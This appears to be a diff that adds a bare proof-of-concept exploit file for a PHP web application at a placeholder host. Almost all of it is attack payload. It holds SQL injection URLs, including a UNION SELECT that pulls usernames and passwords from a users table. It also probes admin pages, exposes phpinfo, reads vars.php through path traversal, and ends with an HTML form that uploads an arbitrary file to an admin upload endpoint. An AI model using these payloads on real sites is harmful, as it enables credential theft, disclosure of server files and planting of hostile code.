@@ -1,0 +1,23 @@
+http://www.example.com/print.php?id=1&#039;+and+1=1/*
+http://www.example.com/style.php?template=1&amp;module=&#039;+union+select+concat_ws(0x7c,username,pass)+from+users/*
+http://www.example.com/iframe.php?field=username&amp;module=users/*
+http://www.example.com/iframe.php?field=pass&amp;module=users/*
+http://www.example.com/admin/phpinfo.php
+http://www.example.com/admin/show_img.php?type=text/plain&amp;img=File
+http://www.example.com/admin/show_img.php?type=text/plain&amp;img=../vars.php [Get
+            
+&lt;html&gt;
+            
+&lt;form action=&#039;http://www.example.com/admin/x_image.php?type=background&#039;
+method=post enctype=multipart/form-data&gt;
+&lt;input type=file name=&#039;file_upload&#039;&gt;
+            
+&lt;input type=hidden name=insert value=1&gt;
+            
+&lt;input type=hidden name=s_rc value=&#039;file://&#039;&gt;
+            
+&lt;input type=submit&gt;
+            
+&lt;/form&gt;
+            
+&lt;/html&gt;
